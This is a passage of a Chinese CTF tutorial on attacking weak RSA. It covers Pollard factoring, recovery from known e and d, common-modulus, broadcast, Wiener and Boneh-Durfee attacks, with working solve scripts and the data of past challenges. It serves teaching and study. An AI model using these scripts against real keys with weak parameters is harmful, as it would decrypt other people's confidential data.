,N)呢？那么概率就会更大，就是这么个道理。关于Rho算法，要注意有可能会进入死循环，也就是说我们要在算法中对其进行判圈，具体的做法是，每次a=f(a)，再找一个b=f(f(b))，如果有一个时刻a=b那么就退出循环，因为b是以两倍的速度走得，当b追上了a，那么b至少已经走完一圈了。 脚本如下： 1234567891011121314151617181920212223242526272829303132def gcd(a,b): while b != 0: t = b b = a % b a = t return adef Pollard_Rho(num): y = 2 x = 2 factor = 1 count = 0 if num==1: return 1 else: if num % 2 ==0: return 2 else: while factor == 1: if count %1000 == 0: print count x = (x*x + 1) % num y = (((y*y + 1) % num) ^ 2 + 1) % num factor = gcd( abs(x - y), num ) count += 1 return factorn = xxxres = Pollard_Rho(n)print (res) 3.Pollard P-1 这种方法是在p-1的素数分解式中不含有大于预定B值的素因数的情况下，找到一个基本的素数p，求出一个数的素因数。方法有点特殊，它只能应用在求整数n的一个素因子p，且p-1能被“小”因子整除的情况下，除此之外该方法无法正常应用。但是这个方法运用起来相当简单，所以在防止因式分解攻击时，必须考虑这一方法 脚本如下： 123456789101112131415161718192021222324252627282930# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef gcd(a,b): while b != 0: t = b b = a % b a = t return adef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1n = xxxp = factor(n)print("p",p) 例题:ASIS-CTF-Finals-2017 Handicraft_RSA题目可以提取出加密脚本： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/pythonfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom secret import s, FLAGdef gen_prime(s): while True: r = getPrime(s) R = [r] t = int(5 * s / 2) + 1 for i in range(0, t): R.append(r + getRandomRange(0, 4 * s ** 2)) p = reduce(lambda a, b: a * b, R, 2) + 1 if isPrime(p): if len(bin(p)[2:]) == 1024: return pwhile True: p = gen_prime(s) q = gen_prime(s) n = p * q e = 65537 d = inverse(e, (p-1)*(q-1)) if len(bin(n)[2:]) == 2048: breakmsg = FLAGkey = RSA.construct((long(n), long(e), long(d), long(p), long(p)))for _ in xrange(s): enc = key.encrypt(msg, 0)[0] msg = encprint key.publickey().exportKey()print '-' * 76print enc.encode('base64')print '-' * 76 以及一些output 1234567891011121314151617-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXsz9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsdsetnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpDffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAAAQIDAQAB-----END PUBLIC KEY---------------------------------------------------------------------------------eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==---------------------------------------------------------------------------- 解题脚本: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import base64from Crypto.Util.number import *from Crypto.PublicKey import RSAdef gcd(a,b): while b != 0: t = b b = a % b a = t return a# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1def decrypt(n, p, q): assert p * q == n e = 65537 d = inverse(e, (p-1)*(q-1)) key = RSA.construct((long(n), long(e), long(d), long(p), long(q))) msg = base64.b64decode("eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==") for _ in xrange(20): enc = key.decrypt(msg) msg = enc print repr(msg)asciikey = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXsz9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsdsetnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpDffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAAAQIDAQAB-----END PUBLIC KEY-----"""key = RSA.importKey(asciikey)n = int(key.n)# p = 139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001p = factor(key.n)q = n / pdecrypt(n, p, q) 4.已知e,d分解n在有的时候会有两道连续的RSA题目，第二道题的n和第一题的一样，但e不一样，这个时候就可以通过这个方法求解第二题参考资料算法如下： 7 实现代码如下： 1234567891011121314151617181920import randomdef facN (N,e,d): k = e*d - 1 t = k x = 1 y = 1 while True: g = random.randint(2,N-1) y = gcd(x-1,N) if x &gt; 1 and y &gt; 1: print('find!') print(y) print(N/y) return y,N/y if t % 2 == 0: t = t/2 x = pow(g,t,N) else: t = k continue 例题:HITB-2017 Hack in the card IIWP参考此篇文章这道题的前一道相关题在本文章的侧信道攻击一栏的例题中题目给出了新的公钥文件 publickey.pem和密文 密文 1016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 我们通过提取新的公钥文件中的N和e可以发现N没有变但是e变了，所以我们就可以通过前一题得到的N，e和d分解出p和q，然后算出新的d并解密密文 解题脚本如下: 123456789101112131415161718192021222324252627282930313233343536373839404142import randomimport gmpy2def gcd(a,b): if a==0: return 0 while b != 0: t = b b = a % b a = t return adef facN (N,e,d): k = e*d - 1 t = k x = 1 y = 1 while True: g = random.randint(2,N-1) y = gcd(x-1,N) if x &gt; 1 and y &gt; 1: print('find!') print(y) print(N/y) return y,N/y if t % 2 == 0: t = t/2 x = pow(g,t,N) else: t = k continue m = 0x16d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977n = 0x17AE4F9BD4FF06B94C46DCBB7070070C7C23C4E8728BE3173CA815FCA5471C0BB35B19ED8838530ABB27D69B1C9D87229D0658D807D8EF74D732576DF4FBA9CD611FC768BE6047C52E8168A1C77E0E54D4877DC20A73FC3A2DB35DDE8700E79BAF61676BF6B6B27032E6B9F3A02F3FAAAFF36251BF2935D9CB45EFAC13D0974484C3D53C2A66A3D279D2B1B594F3797C0B8D33409161F7293EECB5287F45DA104020F0215BCC824338AD4A316E25E4A167A6E4928AF122FA0A55C4E55DEE01A4E0EED89F4B290BF79B5CAFE797AE4FA4B369E043AA0DFE91487E9054FF843EA249ED7945C8A911796F81A0F82EB5694A2FE2EBFF13A9E6DF3334FCAA1C63CBAC3e = 0x14e9914b4cb427de38ac7956930f417ca8e46db1bb3fd343fef9825d467140aceb480dae5b164a7d2b0d2c5c4cbc2a3360409918173efee1d26f26b3020985bfb2675529710e6e61e4f3a960e9474ee5e14666f2fba26a535d73360242b2424e1a56a21e1c314da9b112444388767fa6cba8d94487382787d6c531fa2d131489605b161a09a5ca6999d479b2124a1f203907407ce1ac2f627ad8bc1911f66d9c4f2e2b974b43018a87b01bb8055b191d4a8f8dbd17ecbace3ec4b6f84b606830c282eb512cf51edf0a535bedda909cbf55c68a5ffca3c802def58ef9a0cbabd62d626f95fdc4eeb56d1d30ded03d81061c7093322bbd7b6ceb957a12583aa2625d1 = 16390828876181053318339100750675858805085075693347294634845140223155300471343339735725090534836292007632963907771855159582051536368599877409046147073794159158745099750588781353203665310135991045663088765613847315146223892540146656146285947287434457737619192355597891759277954557284874079842576095414413634632218060041204741585014292743457235750761832960116264601238658366251628950826877369616205949504632422319118366206008416080422671942922507275909660907589263322598929672262664264325308446859589845055502830104300952306424775575141740987190395212323715203016486280360859837271948470735247258851655355384807804629939e1 = 0x01583f58ca9230c4f8844c7f33d61983c27bf611947a1dce390073038805175b18f245543b61c6eaab46a572d03426476e9aecc34716cdac9e33f031f5381d18cf212a8191f826dd10e04fdb506ba9fd91e4831d8adc4c75aa2aa6132e7e48eac66d7ecf24428295eb1b7c64480cf170be83bcd853f9779e6df5999c2beef838d2f0c4d8fc4d9c8e4c6c37259446689ec30634bcd68f293c58cd44039be6299f92649620d6e6017dfd6007d1bd012df7cabec459e0e983f17b5051af4a4fca5cc71cdd72a6f4808e73f833917c2f54801bd9a06e3599edb9a62936764ce084dbf555c16f9e4781ead6fd39792476c6dfc0dd05ada281f75111efd7528065d9e35bp , q = facN(n,e1,d1)d=gmpy2.invert(e,(p-1)*(q-1))t=pow(m, d, n)#t = '484954427b7468657920736179207468617420686973746f7279206973207772697474656e2062792074686520766963746f72737d'print hex(t)[2:].decode('hex') 公共模数攻击公共模数就是指用相同的n加密同一段密文，这样做是十分危险的，因为我们可以利用数学推导绕过d直接得到明文。具体的推导如下：我们假设m为信息明文，两个加密公钥分别为e1和e2，公共模数是n，则有$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 因为e1与e2互质，故我们用欧几里得算法能够找到s1和s2满足下面的关系$$e_1^{s1}+e_2^{s2}=1$$ 式中的s1和s2皆为整数，但是一正一负。我们假设s1为正数，s2为负数因为$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1} mod(n))^{s1}\times (m^{e2} mod(n))^{s2}) mod(n)$$ 根据模运算性质，可以化简为$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1})^{s1}\times (m^{e2})^{s2}) mod(n)$$ 即$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^{e1^{s1}+e2^{s2}}) mod(n)$$ 又因为前面提到过$$e_1^{s1}+e_2^{s2}=1$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^1) mod(n)$$ 即$$C_1^{s1}\times C_2^{s2} = m$$ 这样我们就可以通过c1,c2,e1和e2得到密文了脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: utf-8 -*-from gmpy2 import invert#可以使用libnum包中的n2s或者自己写一个#from libnum import n2sdef n2s(num): t = hex(num)[2:] if len(t) % 2 == 1: return ('0'+t).decode('hex') return t.decode('hex')#欧几里得算法def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)if __name__ == '__main__': print "模数n：" n = input () print "密文C1：" c1 = input () print "密文C2：" c2 = input () print "公钥e1：" e1 = input () print "公钥e2：" e2 = input () s = egcd(e1, e2) s1 = s[1] s2 = s[2] #求模反元素 if s1&lt;0: s1 = - s1 c1 = invert(c1, n) elif s2&lt;0: s2 = - s2 c2 = invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n print n2s(m) 当然还有这种类型的共模攻击,脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# -*- coding: utf-8 -*-import sys,gmpy,base64def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mdef pad_even(x):#重要！凑齐2位，将0x1 变成 0x01 return ('', '0')[len(x)%2] + xdef CipherB2n(c):#将base64编码后的密文转成数字 c2 = base64.b64decode(c) temp = '' for i in c2: temp += pad_even(str(hex(ord(i)))[2:]) temp = eval('0x'+temp) return (temp)def CipherN2b(m):#将数字转换成ascii hex_m=hex(m)[2:] if hex_m[-1] == 'L' : hex_m=hex_m[:-1] return hex_m.decode('hex')if __name__ == '__main__': sys.setrecursionlimit(1000000) e1 = 2333 #根据分解结果 e2 = 23333 #根据分解结果 s = egcd(e1, e2) s1 = s[1] s2 = s[2] c1 = 'XSKBJ2biS6brC5iGwU0GZitHdVM3HXAiwtFnVf2+HTaUqFahxL+BxBi2QDcx7gLxcjEWCMwFP6DS92nMAU4r0gPWSEUIoY57sgNZsjDIDAukiYeLNDUgYz+1P+nF4fk7gwPdozrIvAXGDBvMBjuviqsC8vmVP3I6eLLkt9C46HFt0SBw5ycfAjVoDF2r7/4B1UDs4G0dpIDUCk4khezzgqspn6tqtwOGB27vrKegoL/FlwmutFYIuRKKCBKx3yc/qfWXZ84Oo8nPqgaxgDlxWeLtGM9ZouwFKnagmjbnH+58Pescw4XYafXKqFjQz3XrK/uUESE8jIEIPeL1+8yUpw==' c2 ='EruzwVAXSVLC3rldjcsx6HO0UUICdR9xxgr9eWNhIW0T8l2O3yT/LlFLK2+YU0HB97xr5HaiZesk4T6IuJ9+iOzB8YSkWMfYvOSDKn7Jng/1Q3wQuoldm+UurmZkiEs9kFi+EhsCNAbVAnLzLXLwzYm3emamueDqru4Doo/lSMz8p0+jqz24HscJN9shU85WX4JngW92REHHV8rPHaisCdxeAs+uPyTNzO4IbwDaJvw3ZR/Lo4m1K2Qw8PbYnOcgVr9CWR7mVyxofoWk6qWpQf3d0fX6wbbPcQkXxnnqLWy5S3PZcNQa1wkfRTJJO03QmNVsOivXGb3GzmeZbxmVhQ==' c1 = CipherB2n(c1) c2 = CipherB2n(c2) #print hex(c1) n = 17362520124149736059291605717839814089431261833972408175766504894876091272021197374480215582589878198406028065354454242540322618614670160317701698407729515781811530180885334265851364490357884909336085410775168953942120359215038925025305363480538685487988827339463890539279008285241711326041868183805848503077373967082910932422798165242481154593794712639251157856102009630894845049984346776659339380886766804814959778048440996937820138560802077375885700500737699904011032451007341777160586467318264288370080315519305800247682611802774996999330812534723806925426052547128371180683265963525581842037399869323246530085399 #共n if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m=(pow(c1,s1,n)*pow(c2,s2,n)) % n print m print CipherN2b(m) 低加密指数广播攻击如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： $$C_1\equiv m^{e} mod(n_1)$$$$C_2\equiv m^{e} mod(n_2)$$$$C_3\equiv m^{e} mod(n_3)$$ 对上述等式运用中国剩余定理，在e=3时，可以得到： $$C_x\equiv m^{3} mod(n_1n_2n_3)$$ 通过对Cx进行三次开方可以求得明文。 例题:XCTF 4th-WHCTF-2017 OldDriver题目给了如下信息： 12345678910[&#123;&quot;c&quot;: 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, &quot;e&quot;: 10, &quot;n&quot;: 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;&quot;c&quot;: 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, &quot;e&quot;: 10, &quot;n&quot;: 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;&quot;c&quot;: 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, &quot;e&quot;: 10, &quot;n&quot;: 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;&quot;c&quot;: 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, &quot;e&quot;: 10, &quot;n&quot;: 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;&quot;c&quot;: 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, &quot;e&quot;: 10, &quot;n&quot;: 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;&quot;c&quot;: 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, &quot;e&quot;: 10, &quot;n&quot;: 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;&quot;c&quot;: 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, &quot;e&quot;: 10, &quot;n&quot;: 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;&quot;c&quot;: 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, &quot;e&quot;: 10, &quot;n&quot;: 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;&quot;c&quot;: 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, &quot;e&quot;: 10, &quot;n&quot;: 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;&quot;c&quot;: 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, &quot;e&quot;: 10, &quot;n&quot;: 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;] 脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# coding:utf8from struct import pack,unpackimport zlibimport gmpydef my_parse_number(number): string = "%x" % number #if len(string) != 64: # return "" erg = [] while string != '': erg = erg + [chr(int(string[:2], 16))] string = string[2:] return ''.join(erg)def extended_gcd(a, b): x,y = 0, 1 lastx, lasty = 1, 0 while b: a, (q, b) = b, divmod(a,b) x, lastx = lastx-q*x, x y, lasty = lasty-q*y, y return (lastx, lasty, a)def chinese_remainder_theorem(items): N = 1 for a, n in items: N *= n result = 0 for a, n in items: m = N/n r, s, d = extended_gcd(n, m) if d != 1: N=N/n continue #raise "Input not pairwise co-prime" result += a*s*m return result % N, Nsessions=[&#123;"c": 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, "e": 10, "n": 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;"c": 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, "e": 10, "n": 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;"c": 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, "e": 10, "n": 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;"c": 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, "e": 10, "n": 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;"c": 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, "e": 10, "n": 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;"c": 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, "e": 10, "n": 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;"c": 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, "e": 10, "n": 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;"c": 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, "e": 10, "n": 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;"c": 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, "e": 10, "n": 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;"c": 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, "e": 10, "n": 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;]data = []for session in sessions: e=session['e'] n=session['n'] msg=session['c'] data = data + [(msg, n)]print "Please wait, performing CRT"x, n = chinese_remainder_theorem(data)e=session['e']realnum = gmpy.mpz(x).root(e)[0].digits()print my_parse_number(int(realnum)) 低解密指数攻击与低加密指数相同，低解密指数可以加快解密的过程，但是相对的也带来了安全问题。 1.Wiener攻击在RSA系统中，如果以下条件满足：$$q &lt; p &lt; 2q$$且$$d &lt; n^{1/4}$$那么我们就可以利用连分数的渐进分数攻击得到d 原理 1 2 利用脚本如下： 12345678910111213141516171819from sage.all import continued_fraction, Integer, inverse_moddef wiener(e, n): q0 = 1 M = 1333337 C = pow(M, e, n) for x in continued_fraction(Integer(e) / Integer(n)).convergents(): q1 = int(x.denominator()) # see Andrej Dujella. "A variant of Wiener’s attack on RSA" for r in range(10): for s in range(10): d = r*q1 + s*q0 if pow(C, d, n) == M: return d q0 = q1e = xxxn = xxxd = wiener(e, n) 例题:ASIS-CTF-Finals-2017 Gracias题目给了类似RSA的算法的公钥和密文，并且脚本中可以发现是先生成比较小的d再生成的e。同时n是由三个质数相乘生成的，不过并不影响使用wiener攻击。解题脚本如下 123456789101112131415161718192021222324252627from sage.all import continued_fraction, Integer, inverse_modpubkey = (1696852658826990842058316561963467335977986730245296081842693913454799128341723605666024757923000936875008280288574503060506225324560725525210728761064310034604441130912702077320696660565727540525259413564999213382434231194132697630244074950529107794905761549606578049632101483460345878198682237227139704889943489709170676301481918176902970896183163611197618458670928730764124354693594769219086662173889094843054787693685403229558143793832013288487194871165461567L, 814161885590044357190593282132583612817366020133424034468187008267919006610450334193936389251944312061685926620628676079561886595567219325737685515818965422518820810326234612624290774570873983198113409686391355443155606621049101005048872030700143084978689888823664771959905075795440800042648923901406744546140059930315752131296763893979780940230041254506456283030727953969468933552050776243515721233426119581636614777596169466339421956338478341355508343072697451L, 171012227587318507773834753911094468358648971527111097308935888531930900156798659257578479378777764146070352809723708236353390208094909385240006920137781562826981091183813955039359863361624869703055918575613667858215532572602435432258750639197322091887713402631456113333645709142822182724397962837201266977523L, 96969753191136466007366303619618019752521508403657426306543836447071659732926802256183021740376016065813234292694535879838415771865207311953800116203362150588941093508091412441933752168889516206420588410478242229762908362637083786338280959547015086176046206126019992386890758970740552952647510652431386064722L)c=(1569733526826523065259704222721381245770313117205865099913421859731162526943498524936251685846967970606251353344665893442015804015671457823645874503670136308040791285744658847419176471348768113798503897694020110157476679833746227801224812046930570487233225157924912272791212802495997329083436189937249314855532400635293522270501567950040825794060896420481676398789310029592608176167251882124182145471818654414925639589921023176070657483148482403065241178276749773L, 139537660044872985880471632333334179976891152860359271230202507995985566816703080930428310461057387079799847266510420206696052591677854190150642820963140050439023069266243433278700748622126726137374130247097863526461696642750021196138340072411724739383716017406022211953417323065831672315854246554523225039827L)def wiener(e, n): q0 = 1 M = 1333337 C = pow(M, e, n) for x in continued_fraction(Integer(e) / Integer(n)).convergents(): q1 = int(x.denominator()) # see Andrej Dujella. "A variant of Wiener’s attack on RSA" for r in range(10): for s in range(10): d = r*q1 + s*q0 if pow(C, d, n) == M: return d q0 = q1n, e, a, g = pubkeyc1, c2 = cd = wiener(e, n)# d = 100556095937036905102538523179832446199526507742826168666218687736467897968451k = pow(c1, d, n)K = pow(g, k, a)print '&#123;:x&#125;'.format(c2 * inverse_mod(K, a) % a).decode('hex') 并且这道题也可以用Boneh-Durfee attack做，脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from sage.all import *# Original: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sagedimension_min = 7def remove_unhelpful(BB, monomials, bound, current): if current == -1 or BB.dimensions()[0] &lt;= dimension_min: return BB for ii in range(current, -1, -1): if BB[ii, ii] &gt;= bound: affected_vectors = 0 affected_vector_index = 0 for jj in range(ii + 1, BB.dimensions()[0]): if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj if affected_vectors == 0: #print "* removing unhelpful vector", ii BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): if BB[kk, affected_vector_index] != 0: affected_deeper = False if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]): #print "* removing unhelpful vectors", ii, "and", affected_vector_index BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB return BBdef boneh_durfee_small_roots(pol, modulus, mm, tt, XX, YY): PR.&lt;u, x, y&gt; = PolynomialRing(ZZ) Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): if monomial not in monomials: monomials.append(monomial) monomials.sort() for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) monomials.append(u^kk * y^jj) nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) nn = BB.dimensions()[0] if nn == 0: print "failure" return 0,0 BB = BB.LLL() PR.&lt;w,z&gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[0, jj] / 